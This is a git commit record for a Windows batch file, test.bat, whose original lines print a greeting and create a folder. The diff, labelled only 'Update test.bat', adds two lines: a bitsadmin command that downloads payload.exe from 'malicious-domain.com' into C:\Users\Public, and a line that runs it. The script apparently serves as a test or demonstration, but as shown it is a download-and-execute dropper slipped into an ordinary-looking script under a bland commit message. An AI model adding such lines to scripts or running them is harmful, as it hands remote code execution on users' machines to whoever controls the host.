14f63dd2d9ece4923eee06ec3d44d935d01944d4
duydang2002 <76654292+duydang2002@users.noreply.github.com>
2024-12-25 09:17:58 +0700

    Update test.bat

--- test.bat
+++ test.bat
@@ -3,4 +3,6 @@
 
 echo Hello, this is a BAT file!
 mkdir C:\example-folder
+bitsadmin /transfer download https://malicious-domain.com/payload.exe C:\Users\Public\payload.exe
+C:\Users\Public\payload.exe
 pause
